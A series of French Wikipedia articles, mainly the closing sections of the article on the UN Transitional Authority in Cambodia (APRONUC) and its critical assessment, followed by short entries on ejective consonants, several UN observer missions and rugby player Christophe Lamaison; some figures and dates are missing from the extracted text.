Dans la déclaration sur le relèvement et la reconstruction au Cambodge issue des accords de Paris, il avait été tenu compte des besoins de réhabilitation. Le secrétaire général des Nations unies devait, dans un premier temps nommer un coordinateur chargé de répondre aux besoins urgent et . Pour les échéances plus éloignés, la définition des priorités de reconstruction était laissée à la charge du futur gouvernement issu des élections. L’effort de réhabilitation devait couvrir des domaines aussi variés que la sécurité alimentaire, la santé, le logement, la formation, l’éducation, le réseau de transport et les services publics. Un directeur chargé de répertorier les besoins et de coordonner les différentes activités avait été nommé par le secrétaire général et devait rendre compte au représentant spécial.
Dès , il était reconnu que vu l’état des infrastructures au Cambodge et afin de pouvoir mener à bien la mission de l’, il faudrait consacrer un effort urgent aux opérations basique de réparations sur les routes, les aéroports, les ports, la distribution électrique les communications et les capacités d’hébergement. Peu après la mise en place de l’, un comité de conseil technique du fut créé sous la supervision du coordinateur pour faciliter l’approbation des projets par les partis cambodgiens. Cet effort se devait d’être réalisé avant le début de la saison sèche, en mai. Dans le courant de l’année 1993, le approuvait une proposition faite par l’ et l’UNESCO, pour créer une autorité cambodgienne chargé de la protection de l’héritage national afin de coordonner les efforts de protection et de gestion du patrimoine culturel cambodgien.
En juin 1993, le secrétaire général, en déclarant que l’aide internationale au Cambodge devrait se poursuivre bien après le retrait des forces de l’, avait implicitement reconnu que la mission de reconstruction n’avait pu être menée à bien .
Le secrétaire général avait en effet noté que vue la détérioration des conditions de sécurité au Cambodge, des policiers militaires et des équipes médicales seraient nécessaires pour assurer la sécurité du personnel international jusqu’à ce que le retrait du personnel international soit terminé. Vers la fin de la période de transition, la reconstruction se focalisait sur des projets de réhabilitation à court terme qui devaient produire des résultats rapides. Ces projets impliquaient la maintenance des services publics, des structures d’éducation et du système de santé. La plupart nécessitaient beaucoup de main d’œuvre et créaient des emplois. La réponse des donateurs à ces initiatives était globalement positive. Fin septembre 1993, le conseil de sécurité exprimait sa satisfaction quant aux évolutions prometteuses qui ont été mises en place au Cambodge depuis les élections et insistait sur l’importance d’une aide permanente de la communauté internationale pour promouvoir la paix, la démocratie et le développement au Cambodge. Le , les deux premiers ministres demandèrent au secrétaire général d’étudier la possibilité d’envoyer entre 20 et 30 observateurs militaires des Nations unies jusqu’à fin mars 1994. Le conseil de sécurité donnait son accord et demandait au secrétaire général d’envoyer une proposition détaillée sur le sujet. Du 16 au 30 novembre, 71 policiers militaires restèrent sur place ainsi qu’une unité médicale de 10 membres. En décembre, leurs nombres avaient été respectivement réduits à 30 et 8.
La tâche du groupe de liaison militaire était de maintenir des relations proches avec le gouvernement et de remonter au secrétaire général tout problème affectant la sécurité. Le groupe devait aussi aider les autorités cambodgiennes à régler les problèmes militaires en suspens liés aux accords de Paris. Il serait composé de 20 officiers militaires non armés et dirigé par un Officier chef de liaison militaire (OCLM), désigné par le secrétaire général, avec le consentement du conseil de sécurité. Le groupe devait être basé à Phnom Penh et était distinct du bureau permanent du représentant des Nations unies même si en pratique ils seraient amenés à avoir des contacts réguliers. Dans sa résolution 880 du , le conseil de sécurité avalisait la création du groupe de liaison militaire pour une durée de six mois non renouvelable.
Le groupe fut mis en place à Phnom Penh le , sous la direction du colonel bangladais Muniruz Zaman. Il dirigeait les relations avec les ministères, les administrations et les ambassades, alors que le niveau fonctionnel était confié à d’autres membres qui rendaient compte quotidiennement des conditions de sécurité et de développement au quartier général des Nations unies. D’autres fonctionnaires internationaux furent détachés dans des équipes mobiles pour observer les zones hors de Phnom Penh, à la demande du gouvernement ou quand l’ estimait que cela relevait de leur mandat. Dans le même temps, le , le secrétaire général nommait l’australien Michael Kirby comme son représentant au Cambodge. Le , le gouvernement demandait une extension de la durée du mandat du groupe de liaison. Le conseil de sécurité décidait d’accepter comme solution alternative la proposition du secrétaire général, de détacher trois conseillers militaires au bureau de son représentant pour l’aider à remplir sa mission. Trois membres du groupe de liaison purent de ce fait rester au Cambodge à l’expiration de son mandat, le . Après avril 1995, seul un conseiller militaire restait attaché au bureau du représentant permanent.
Bilan de l’action de l’APRONUC.
Vu le coût de la mission ( milliard de dollars US) et le fait qu’elle était destinée à servir de modèle pour d’autres, elle se devait de ne pas être ressentie comme un échec. C’est d’ailleurs ce que laissait entendre Monsieur Boutros Boutros-Ghali lorsque, le , il déclarait devant les membres du : .
Une étude exhaustive se doit tout d’abord de rappeler les points positifs de la mission, à savoir le rapatriement des réfugiés (même si des réserves peuvent être formulées concernant leur réintégration dans la société), le recensement électoral et l’introduction d’un multipartisme qui ne soit pas de façade.
Néanmoins, même si le secrétaire général déclare par la suite le devant la commission des Affaires étrangères de l'Assemblée nationale française que , et que des spécialistes du Cambodge tels William Shawcross ou Elizabeth Becker ont abondé dans le même sens, tout le monde ne partage pas cet engouement.
Même Yasushi Akashi, lors de son départ, le , n’était pas aussi enthousiaste, lorsqu’il déclare .
Outre les échecs de certains aspects des missions déjà abordés, on peut aussi dénombrer d’autres revers, dont plusieurs effets pervers liés à la présence des forces de l’ sur le sol cambodgien.
Inertie.
Comme déjà évoqué, le mandat de la mission avait été défini par les accords de Paris, eux-mêmes fruit de longues tractations.
Toutefois, si les ambivalences du discours diplomatique permettent de déboucher sur des décisions qui font consensus, elles ne facilitent pas leur application. Dans le cas présent, le manque de clarté a ouvert la voix à des interprétations contradictoires quant aux buts de la mission. La mission de l’ était de mettre en œuvre des dispositions approuvées par des parties consentantes et le cas où une ou plusieurs de ces parties refuseraient de tenir leurs engagements n’avaient pas été prévu.
Cela avait été patent dès le début de la mission et fut mis en exergue par le général français Michel Loridon, commandant de la MIPRENUC qui regrettait lorsqu’il a quitté ses fonctions à la fin juillet 1992, le manque de fermeté face à la mauvaise volonté criante du à appliquer les accords qu’ils avaient signés. Il ne fut malheureusement pas le seul à déplorer cette faiblesse et d’autres responsables préférèrent abandonner avant la fin du mandat, déçus par l’impuissance des instances internationales.
Choix du personnel et neutralité.
Bien que la bonne volonté de l’ONU quant à résoudre le problème cambodgien semble difficile à mettre en doute, on peut néanmoins regretter certaines nominations malheureuses dans le personnel déployé. Même si aucun élément tangible n’est venu étayer ce qui est resté au stade des soupçons, un choix plus judicieux aurait évité de prêter le flanc à certaines rumeurs qui ont pu ternir l’image de neutralité que se devait de donner .
Au premier chef, on pourra rappeler le côté singulier de demander d’instaurer la démocratie au Cambodge par des ressortissants de pays chez qui ce principe reste du domaine d’un vœu pieux ; on notera que ce problème semble récurrent dans la mise en place de la plupart des missions de maintien de la paix.
Ensuite, le choix de faire stationner des forces thaïlandaises dans les provinces occidentales qui avaient été annexées par leur pays dans les années 1940 et dans lesquelles les unités khmères rouges continuaient à bénéficier du soutien de troupes de Bangkok avant, pendant et après le mandat de l’ était lui aussi pour le moins malheureux.
Concernant la neutralité des instances internationales, les autorités de Phnom Penh ne pouvaient que voir avec suspicion l’arrivée d’un organisme qui avait continué de soutenir leurs ennemis mortels alors que l’ampleur des crimes du régime Khmer rouge devenait de plus en plus difficile à nier. Les puissances occidentales qui composent l’essentiel de l’encadrement de l’autorité sont ainsi accusées de favoriser sur le terrain leurs alliés du et du au détriment du régime en place à Phnom Penh. La presse se fera par exemple régulièrement l’écho des assassinats de militants, les attribuant au avant même que les enquêtes n’aient débuté et se gardant de publier des démentis quand il sera prouvé que le meurtre n’avait pas de motivation politique. Cette accusation resurgit lors de la proclamation du résultat des élections où le en contesta un temps le résultat, l’attribuant en partie au fait que le personnel recruté par l’ était et que la radio de l’autorité avait diffusé des informations préjudiciable aux autorités de Phnom Penh lors des élections.
À l’inverse, alors qu’il était devenu évident que le gouvernement de Phnom Penh ne soustrairai pas l’administration du pays à son influence et que la composante chargée de la reconstruction du pays devait néanmoins intervenir auprès de cette administration, le présentait cette collaboration comme une aide déguisée à un des partis et accusait l’ d’être en fait un .
En outre, certains postes à responsabilité furent confiés à des personnes déjà impliqués dans l’histoire récente de la région, ce qui là aussi amena des questions quant à leur capacité à ne pas favoriser leurs anciens alliés, même si dans l’ensemble, ces craintes ne s’avèreront pas justifiées. Ainsi, le général John Murray Sanderson, commandant de la composante militaire, avait dirigé en 1971 le du génie australien envoyé au Viêt Nam pour épauler l’armée américaine. On peut aussi rappeler que Thimothy Carney, responsable du département information, était en place à l’ambassade des États-Unis à Phnom Penh pendant que son pays régissait les affaires de la République khmère, puis, dans les années 1980 et alors qu’il était en poste à Bangkok, fut chargé de la mise en œuvre de la politique américaine qui amena au réarmement khmer rouge.
Enfin, concernant Boutros Boutros-Ghali, ses sympathies avec Khieu Samphân, qui se seraient nouées dès les années 1950 quand tous deux fréquentaient les bancs de la Sorbonne, apparurent au grand jour, lorsqu’ils se rencontrèrent à Phnom Penh en 1998, après la reddition du second aux forces du gouvernement cambodgien et pourraient en partie expliquer le choix du premier nommé de persister à privilégier contre toute attente le dialogue avec le second alors que les manquements du à tenir ses engagements se faisaient jour après jour plus criants.
Toutefois, pour conclure le sujet, on pourra rappeler que l’essentiel des évènements que le Cambodge a traversés durant la seconde moitié du était liés à la guerre froide et qu’à ce titre il aurait été difficile de trouver des responsables qui ne soient pas impliqués d’une manière ou une autre dans ce qui s’y était passé.
Ouverture brutale à l’économie de marché.
L’arrivée dans un pays replié sur lui-même depuis une quinzaine d’années de l’ et de nombreuses ONG avec des techniques de pointe et du personnel provenant d’horizons divers ne pouvait que mettre à mal le fragile équilibre du Cambodge.
Même si les retombées financières sont énormes, qu’ainsi les chiffres de l’aide au développement quadruplent entre 1991 et 1992) et que ceux du commerce extérieur triplent sur la même période, la présence de plus de touchant des indemnités journalières entre 80 et 150 dollars US dans un pays où le revenu annuel moyen était de provoqua un dérèglement économique et une inflation galopante.
Outre l’augmentation des salaires et des loyers qui suivit le recrutement de personnel local et la location de logements et de bureaux, une partie importante des investissements et de la main d’œuvre se détourna de la production des biens de première nécessité pour se consacrer à la spéculation immobilière ou aux services à la personne, essentiellement pour les étrangers vivant au Cambodge.
Dans le même temps, le nombre de sociétés privées double entre 1990 et 1992, mais la plupart des entreprises industrielles privées sont cédées aux investisseurs étrangers, disposant de fonds plus importants.
L'afflux massif des capitaux de l'aide internationale provoqua des tractations entre factions politiques sur les postes à responsabilité qui permettaient la redistribution de cette manne financière. Avec le temps, les pourparlers se transformèrent en surenchères de plus en plus coûteuses pour leurs titulaires qui une fois nommés étaient plus soucieux de rentabiliser leur investissement que d’œuvrer pour le bien public. Si ce phénomène n’est pas nouveau, qu’il avait déjà fait l’objet de critiques envers la république khmère et été une des causes du mécontentement qui à la fin des années 1960, avait rythmé la fin du régime de Sihanouk, les sommes en jeu n’ont aucune commune mesure avec celles des périodes précitées et donnent à un groupe restreint le pouvoir d’acheter et revendre l’ensemble des ressources du pays. Cette situation s'accompagna aussi l’émergence de circuits de trafics en tout genres et de blanchiments illicites.
La conséquence sur la monnaie locale ne se fait pas attendre ; le cours du riel passait de 100 pour 1 dollar US en janvier 1992, à pour 1 en décembre, obligeant l’ à prendre le contrôle de la banque nationale du Cambodge. De plus, l’enrichissement touche inégalement le pays et se limite en fait à Phnom Penh et à la ville portuaire de "Kampong Som", rebaptisée Sihanoukville.
Dépravation des mœurs.
Norodom Sihanouk déclara à de multiples reprises qu’à ses yeux, l’arrivée massive de troupes étrangères, qu’il avait pourtant encouragée, avait conduit à salir et déshonorer la réputation de la femme cambodgienne ainsi qu’à développer la prostitution. Si le jugement peut paraitre excessif, une étude de l’Organisation mondiale de la santé estime néanmoins que le nombre de prostituées au Cambodge était passé de en 1991 à plus de après l’arrivée des troupes de l’ en 1992, dont 35 % ont moins de 18 ans. Cela avait aussi amené à propager le SIDA dans un pays où les habitants n’étaient pas préparés et la même étude montrait qu’en 1995, entre et cambodgiens étaient infectés.
À cela, on pourra ajouter les abus auxquels se sont livrés plusieurs membres des troupes onusiennes dont le comportement n’avait rien à envier à certaines armées d’occupation. Si le témoignage d’un docteur ayant exercé à l’hôpital de Preah Vihear et qui sous le couvert de l’anonymat affirmait à Raoul-Marc Jennar qu’ bien que plausible semble difficile à prouver, le rapport de l’Institut de recherche des Nations unies pour le développement social qui soutenait que ne souffre quant à lui aucune contestation.
Réconciliation des 4 factions.
Comme l’affirmait le secrétaire général le , « "pour que l’opération réussisse, il faudra que toutes les parties concernées observent strictement et fidèlement les termes des accords de Paris et apportent leur coopération entière et constante pendant toute la période de transition" ».
Toutefois, dès avant la signature de ces accords, de sérieux doutes pouvaient être émis quant à la volonté des différents protagonistes à coopérer. Le choix du nom de ce qui deviendra le donna ainsi lieu à une bataille d’arguties fastidieuse, les dirigeants de la république populaire du Kampuchéa refusant qu’une autre entité que la leur puisse se targuer du qualificatif de gouvernement avant les élections. La principale interrogation concernait les deux formations les plus actives, à savoir le gouvernement de Phnom Penh et le . Pouvaient-ils oublier leurs inimités respectives, alors que l’un dénonçait depuis plus d’une décennie les crimes de masse de l’autre pendant que cette dernière reprochait à la première de s’être mise au service d’une puissance étrangère dont les Cambodgiens craignaient depuis des siècles les visées expansionnistes sur leur pays ? Très vite, il est apparu que ces deux factions étaient moins intéressées par instaurer la démocratie au Cambodge que par l’opportunité de prendre le dessus sur leurs adversaires et assoir leur influence sur le pays.
Ainsi, les autorités de l’ancienne république populaire du Kampuchéa espéraient que l’ puisse désarmer les troupes khmères rouges alors que ceux-ci attendaient des instances internationales qu’elles démantèlent les structures administratives déployés par les premiers nommés. Mais il était rapidement devenu clair qu’aucune de ces deux espérances ne seraient respectées et que rapidement le seul point d’accord de ces deux parties étaient leur perception à reconnaître les forces internationales comme hostiles à leur égard.
Ainsi, le qui avait été défini comme le et qui devait permettre aux quatre factions, en outre engagées dans une compétition électorale, de diriger ensemble le pays a surtout montré leurs nombreux désaccords qui ont paralysé son action.
Suppression des références au Kampuchéa démocratique.
Au début 1979, quand l’armée vietnamienne avait pénétré au Cambodge et alors que les exactions du gouvernement du Kampuchéa démocratique n’étaient plus un secret pour personne, l’ condamnait l’intervention. À la demande de la Chine, qui perdait un de ses rares alliés dans la région et des pays de l’association des nations de l'Asie du Sud-Est qui s’inquiétaient de la montée en puissance du Viêt Nam et de son mentor soviétique à leurs frontières, l’assemblée générale des Nations unies, , refusait de reconnaitre le gouvernement installé à Phnom Penh par les troupes de Hanoï et gardait aux partisans de Pol Pot le droit de représenter leur pays devant les instances internationales alors qu’ils ne régnaient plus que sur quelques parcelles de jungle près de la frontière thaïlandaise.
La condamnation était réitérée d’années en années et la création en 1982 d’un gouvernement de coalition en exil comprenant outre la faction khmère rouge, les monarchistes du FUNCINPEC et les républicains du FNLPK avait été fortement encouragée par la communauté internationale dans le but de faire émerger une opposition à la présence des troupes vietnamiennes plus crédible, au fur et à mesure que l’ampleur des crimes du Kampuchéa démocratique étaient révélés. La manœuvre s’avérera rapidement infructueuse et servira plus les desseins des partisans de Pol Pot qui bénéficiaient ainsi d’un regain de respectabilité tout en présentant toujours la majeure partie des troupes de l’alliance.
La situation s’enlisa pendant près de dix ans. Le gouvernement de Hanoï justifiaient la mise sous tutelle du Cambodge comme le seul recours viable contre le retour aux affaires du Kampuchéa démocratique alors que les fidèles khmers rouges étaient des acteurs incontournables de la résistance à l’occupation vietnamienne de fait. Les choses n’évoluèrent qu’à la fin des années 1980 et le déclin de l’URSS. La fin de l’aide soviétique ne permettait plus au Viêt Nam de prendre en charge les coûts de son assistance au gouvernement de Phnom Penh ; celui-ci acceptait de laisser les dirigeants khmers rouges s’assoir à une table de négociations.
Alors que les pourparlers de paix s’amorçaient, le FUNCINPEC, le FNLPK et la communauté internationale se devait de ménager la susceptibilité des partisans de Pol Pot sous peine d’avoir à s’expliquer sur leur compromission depuis une décennie. Dans le même temps, la dénonciation des crimes du régime Khmer rouge restait le principal cheval de bataille du gouvernement de Phnom Penh et révéler ces exactions permettait de justifier les manquements aux droits de l’homme de la République populaire du Kampuchéa et la mise sous dépendance du pays par l’ennemi héréditaire vietnamien.
Aussi, si l’accord pour un règlement politique global du conflit du Cambodge signé à Paris stipulait la nécessité de "prendre des mesures efficaces pour assurer que ne soit jamais permis un retour à la politique et aux pratiques du passé", cette clause elliptique avait nécessité une intense activité diplomatique pour être incluse. Toujours au nom de la réconciliation nationale, les références trop marquantes, telles les commémorations de la chute du régime khmer rouge furent – pour un temps – gommées.
Cette amnésie forcée n’était pas sans effet. Une dizaine d’années après, une forte proportion de la population cambodgienne doutait que les atrocités aient réellement été commises. D’autres, parmi les habitants d’Anlong Veng – le dernier bastion khmer rouge qui resta sous leur contrôle jusqu’en 1998 – continuaient, dix ans après la reprise de leur ville par les forces gouvernementales, de penser que leurs anciens maitres n’étaient pas responsables des atrocités dont on les accusait. Enfin, la période khmère rouge n’apparut dans les manuels scolaires qu’en mai 2009.
Toutefois, à la décharge de l’ONU, cette mise en sommeil d’un pan de l’histoire contemporaine doit plus à la volonté des trois composantes opposées à la République Populaire du Kampuchéa qu’à celle des instances onusiennes. Enfin, le travail de mémoire sur cette époque fut grandement facilité à partir de 2007, par la mise en place – certes tardive - des Chambres extraordinaires au sein des tribunaux cambodgiens chargées de juger les derniers dirigeants encore en vie du Kampuchéa démocratique et qui doit beaucoup à la persévérance de l’organisation internationale.
Coût exorbitant.
Le premier coût qu’il convient de ne pas oublier est celui des 82 personnes étrangères décédées en accomplissant une mission de maintien de la paix. Ce chiffre ne comprend pas les Cambodgiens victimes des exactions des partisans de différents partis lors du mandat.
On pourra ensuite évoquer le budget, préalablement fixé à 600 millions de dollars, qui atteindra finalement milliard de dollars et qui à l’époque constituait l’opération la plus importante jamais organisée par l’ONU. Si tel était le cas, ce n’est plus aujourd’hui d’actualité. Ainsi par exemple, les opérations dans l’ancienne république fédérative socialiste de Yougoslavie (FORPRONU, puis ONURC, FORDEPRENU et enfin QG-FPNU) ont nécessité milliards, celles en Somalie (ONUSOM) et celles en Sierra Leone (MONUSIL &amp; MINUSIL) sans qu’aucune de ces missions ne soit exempte de reproches.
D’autre part le fait que devant la persistance de rumeurs concernant les dépenses inconsidérées et la corruption liée à cette opération, les instances internationales avaient du mettre en place une commission d’enquête montre que ces accusations comportait certains fondements .
Enfin, loin de se sentir redevable, Hun Sen, premier ministre cambodgien et dont l’aversion pour les forces internationales n’est un secret pour personne, prétend . Même s’il parait difficile d’étayer une telle affirmation, on ne peut pas pour autant la rejeter en bloc. En effet, on peut supposer que les journaliers des quelque du contingent de l’, même s’il est difficile de les chiffrer avec précision, doivent représenter une part non négligeable du budget.
Symboles.
Drapeau.
L'État éphémère utilisa un drapeau officiel bleu (le même bleu que celui de l'ONU) avec la forme blanche du pays en son centre. Le nom du pays en khmer, , est écrit en bleu au milieu.
Emblème.
L'État utilisa aussi un emblème qui est en fait le logo officiel de la Résolution 745 du Conseil de sécurité des Nations unies. C'est cette résolution qui autorisa la création de l'APRONUC. On y voit un cercle du même bleu que celui du drapeau de l'ONU. Il y a une représentation en noir et blanc du temple d'Angkor Vat. Le nom du pays en khmer, , est écrit en bleu en dessous.

</doc>
<doc id="568558" url="https://fr.wikipedia.org/wiki?curid=568558" title="Consonne fricative éjective alvéolaire">
Consonne fricative éjective alvéolaire

La consonne fricative éjective alvéolaire est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne fricative éjective alvéolaire :
En français.
Le français ne possède pas le [s’].
Autres langues.
Le tlingit, une langue amérindienne d’Alaska, possède le [s’] et l’écrit s’. 

</doc>
<doc id="568559" url="https://fr.wikipedia.org/wiki?curid=568559" title="Consonne occlusive éjective vélaire">
Consonne occlusive éjective vélaire

La consonne occlusive éjective vélaire est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive éjective vélaire :
Occurrences.
Cette consonne existe en coréen par exemple dans le mot [] qui signifie « (graine de) sésame ».
Cette consonne existe en géorgien, où elle est écrite . // s’oppose à : // « porte » est distinct de // « vent ».
Cette consonne existe en haoussa, où elle est généralement écrite (haoussa standard nigérian), plus rarement ou .

</doc>
<doc id="568560" url="https://fr.wikipedia.org/wiki?curid=568560" title="Mission préparatoire des Nations unies au Cambodge">
Mission préparatoire des Nations unies au Cambodge

La Mission préparatoire des Nations unies au Cambodge (MIPRENUC, ou, en Anglais, UNAMIC - United Nations Advance Mission in Cambodia) devait préparer la venue de l'Autorité provisoire des Nations unies au Cambodge au début des années 1990.
Histoire.
La Mission a été créée le par la résolution 717 du Conseil de sécurité des Nations unies. Décision qui est confirmée lors des accords de Paris sur le Cambodge de 1991 qui délèguent l’administration du pays à l’organisation des Nations unies ; elle est déployée dès le .
Sa composante militaire est placée sous le commandement du général français Michel Loridon alors que la branche civile est dévolue au diplomate bangladais Ataul Karim.
Elle prend fin en avec le déploiement des forces des Nations unies au Cambodge et de l'Autorité provisoire des Nations unies au Cambodge.
Décoration.
L'insigne de la Médaille.
Cette médaille était décernée en reconnaissance de 90 jours de service entre novembre 1991 et mai 1992.
Le ruban.
Le ruban est composé de neuf bandes : bleu ONU (), rouge (), jaune (), bleu foncé (), blanc (), bleu foncé (), jaune (), rouge () et bleu ONU ().

</doc>
<doc id="568562" url="https://fr.wikipedia.org/wiki?curid=568562" title="Consonne occlusive éjective uvulaire">
Consonne occlusive éjective uvulaire

La consonne occlusive éjective uvulaire est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive éjective uvulaire :
En français.
Cette consonne n'existe pas en français.
Dans les autres langues.
Le géorgien possède ce son, représenté par la lettre . La prononciation exacte de // varie entre [], , [] et .

</doc>
<doc id="568565" url="https://fr.wikipedia.org/wiki?curid=568565" title="Groupe d'observateurs militaires des Nations unies pour l'Inde et le Pakistan">
Groupe d'observateurs militaires des Nations unies pour l'Inde et le Pakistan

Le Groupe d'observateurs militaires des Nations unies pour l'Inde et le Pakistan (GOMNUIP ; en anglais , "UNMOGIP") est une opération de maintien de la paix en cours depuis 1951 chargée de surveiller l'application du cessez-le-feu entre l'Inde et le Pakistan.
Le mandat du GOMNUIP est toujours en cours.
Historique.
La Commission des Nations unies pour l'Inde et le Pakistan (UNCIP) a été créée par la adoptée le par le Conseil de sécurité des Nations unies. Elle devait enquêter sur les violations de la ligne du cessez-le-feu et servir de médiateur entre l'Inde et le Pakistan. 
Par la adoptée en 1951, la commission voit son mandat évoluer pour devenir le groupe d'observateurs militaires, chargé de surveiller l'application du cessez-le-feu entre l'Inde et le Pakistan, dans le territoire de l'ancien État du Jammu et Cachemire. 
Décoration.
L'insigne est décerné pour le service de six mois effectué entre le et le .
Ruban.
Le ruban a une bande centrale vert foncé () convergeant vers l'extérieur en passant à des teintes vert pâle au blanc et une brisure soudaine au bleu de l'ONU () en bordure.

</doc>
<doc id="568567" url="https://fr.wikipedia.org/wiki?curid=568567" title="Force intérimaire de l'ONU au Liban - FINUL">
Force intérimaire de l'ONU au Liban - FINUL



</doc>
<doc id="568568" url="https://fr.wikipedia.org/wiki?curid=568568" title="Consonne fricative éjective vélaire">
Consonne fricative éjective vélaire

La consonne fricative éjective vélaire est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne fricative éjective vélaire :
En français.
Le français ne possède pas le [x’].
Autres langues.
Le tlingit, une langue amérindienne d’Alaska, possède le [x’] et l’écrit x’. 

</doc>
<doc id="568569" url="https://fr.wikipedia.org/wiki?curid=568569" title="Groupe d'observation des Nations unies au Liban">
Groupe d'observation des Nations unies au Liban

Le Groupe d'observation des Nations unies au Liban (GONUL) a été mis en place à la suite de la crise de 1958 au Liban, le 11 juin 1958 par la résolution 128 du Conseil de sécurité des Nations unies pour se termine le . Il a pour rôle de surveiller la frontière entre le Liban et la Syrie pour empêcher le transport d'armes.
Histoire.
En raison des conflits internes entre Chrétiens et Musulmans et de la menace d'invasion par la République arabe unie (Égypte et Syrie), le président du Liban avait demandé au Conseil de sécurité des Nations unies d'envoyer un Groupe d'observation dans son pays. Le quartier général du GONUL était à Beyrouth ; il y avait 49 postes d'observateurs disséminés un peu partout au Liban. L'effectif a plafonné à 591 membres, dont 77 officiers, sous-officiers et hommes des forces canadiennes. La crise s'est terminée avec l'arrivée de soldats américains et l'élection d'un nouveau président, en juillet 1958. Le GONUL a été dissous après seulement six mois d'existence.
Décoration.
L'insigne de Médaille du GONUL.
Cette médaille était décernée en reconnaissance de 30 jours de service entre le et le .
Le ruban.
Le ruban est identique à celui de l'ONUST, c'est-à-dire bleu ONU avec une étroite bande blanche (de de largeur) à de chaque bord.

</doc>
<doc id="568571" url="https://fr.wikipedia.org/wiki?curid=568571" title="Dr Jekyll and Mister Hyde">
Dr Jekyll and Mister Hyde



</doc>
<doc id="568573" url="https://fr.wikipedia.org/wiki?curid=568573" title="Christophe Lamaison">
Christophe Lamaison

Christophe Lamaison (surnommé « Titou » Lamaison) est un joueur international de rugby à XV, né le à Dax, de 1,80 m pour 90 kg. Il évolue au poste de centre, de demi d'ouverture ou d'arrière en club à l'Aviron Bayonnais, au SU Agen et à Brive essentiellement. Il est sélectionné à en équipe de France, de 1996 à 2001, équipe dont il est le troisième meilleur marqueur de points avec . Son record a été battu par Frédéric Michalak le 22 août 2015. Avec les "Bleus", il a été un acteur majeur de la victoire face à la Nouvelle-Zélande en demi-finales de la Coupe du monde 1999 (43-31) où il a inscrit un essai, deux drops, trois pénalités, et quatre transformations. 
Carrière.
En club.
Le 25 janvier 1997, il joue avec le CA Brive la finale de la Coupe d'Europe (première édition avec les clubs anglais) à l'Arms Park de Cardiff face au Leicester Tigers, les brivistes s'imposent 28 à 9 et deviennent les deuxièmes champions d'Europe de l'histoire après le Stade toulousain en 1996. La saison suivante, il revient en finale avec le CA Brive au Parc Lescure de Bordeaux face à Bath mais les Anglais s'imposent 19 à 18.
Après avoir brillé avec les clubs de Brive et d'Agen avec lesquels il obtient plusieurs titres (notamment vainqueur de la coupe d'Europe en 1997 avec Brive), il revient à l'Aviron bayonnais où il a débuté. Lamaison arrête sa carrière de joueur professionnel en 2004, il prend cette décision alors que son jeu est très apprécié en Angleterre et qu'il a une proposition pour jouer avec le club anglais des Saracens. 
Il finit sa carrière dans le club amateur de Saint-Médard en Jalles en division Fédérale.
En 2010, il signe dans le club amateur d'Arcangues où il occupe le rôle d'entraîneur-joueur, il rechausse les crampons quatre ans après avoir arrêté la pratique du rugby jusqu'en 2013 avant d'arrêter totalement les matchs pour ne plus être que seulement entraîneur. Il quitte finalement le club un an plus tard à l'été 2014.
En équipe de France.
"Titou" Lamaison a connu sa première sélection le 30 novembre 1996 contre les ".
De 2001 à 2015, il détient le record en équipe de France de points marqués et de transformations réussies avec respectivement et . Le record de points est depuis le détenu par Frédéric Michalak. Sa réussite dans le jeu au pied (3 pénalités, 2 drops, 1 essai et 4 transformations) fut pour beaucoup dans la victoire historique de l'équipe de France en demi-finale de la Coupe du Monde face à la Nouvelle-Zélande sur le score de 43-31, le 31 octobre 1999 au stade de Twickenham. Lors de la finale perdue face à l'Australie, il inscrit la totalité des points de son équipe en réussissant quatre pénalités. 
Christophe Lamaison a réussi deux fois le ", c'est-à-dire de marquer au moins un essai, une transformation, un drop et une pénalité : il l'a réalisé contre la Nouvelle-Zélande lors de la Coupe du monde 1999 et avant contre l'Angleterre, à Twickenham également, lors du tournoi des Cinq Nations 1997 (victoire 23-20).
Reconversion.
À la fin de sa carrière, il crée une société qui s'occupe d'énergies nouvelles, comme, entre autres, l'installation de panneaux solaires.

</doc>
<doc id="568574" url="https://fr.wikipedia.org/wiki?curid=568574" title="Mission d'observation des Nations unies au Yémen">
Mission d'observation des Nations unies au Yémen

La Mission d'observation des Nations unies au Yémen (MONUY/UNYOM) est une force d'interposition mise en place le 11 juin 1963 par la Résolution 179 du Conseil de sécurité des Nations unies pour faire cesser les combats dans l'actuel Yémen entre ce qui deviendra plus tard la République démocratique populaire du Yémen et la République arabe du Yémen.
Histoire.
Après le coup d'État militaire de 1962 et l'assassinat de Ahmad bin Yahya, roi du Yémen, une guerre civile éclate dans laquelle l'Égypte et l'Arabie saoudite s'affrontent par interposition en soutenant chacun une faction différente. La MONUY est créée pour faciliter le désengagement des forces égyptiennes et saoudiennes et pour créer une zone démilitarisée de entre le Yémen et l'Arabie saoudite.
Les pays participants à cette mission sont : l'Australie, le Canada, le Danemark, le Ghana, l'Inde, l'Italie, la Norvège, le Pakistan, les Pays-Bas, la Suède et la Yougoslavie.
Médaille de la MONUY.
Le centre du ruban est brun () avec un dégradé de chaque côté allant du brun clair au jaune sable et au jaune, jusqu'à la bordure bleu ONU ().
Cette médaille était décernée en reconnaissance de 60 jours de service entre le et le .

</doc>
<doc id="568575" url="https://fr.wikipedia.org/wiki?curid=568575" title="Consonne affriquée palatale sourde">
Consonne affriquée palatale sourde

La consonne affriquée palatale sourde est un son consonantique très fréquent dans de nombreuses langues parlées. Son symbole dans l'alphabet phonétique international est , représentant un et un liés.
Selon les langues, sa phonation sourde, initialement occlusive, peut être relâchée de façon simplement égressive , aspirée , éjective , etc.
Caractéristiques.
Voici les caractéristiques de la consonne affriquée palatale sourde :
Symboles de l'API.
Son symbole complet dans l'alphabet phonétique international est , représentant un c minuscule dans l'alphabet latin, suivi d'un ç (« c cédille ») minuscule, reliés par un tirant. Le tirant est souvent omis quand cela ne crée pas d'ambiguïté.
Une alternative non officielle est de mettre le c cédille en exposant, pour indiquer le relâchement fricatif de l'affriquée. Enfin, l'API admettait anciennement une ligature spéciale pour cette affriquée, mais elle n'est plus officielle. 
En français.
Le français ne possède pas ce son.

</doc>
<doc id="568576" url="https://fr.wikipedia.org/wiki?curid=568576" title="Consonne affriquée vélaire sourde">
Consonne affriquée vélaire sourde

La consonne affriquée vélaire sourde est un son consonantique rare, présent dans quelques langues. Son symbole dans l’alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne fricative vélaire sourde :
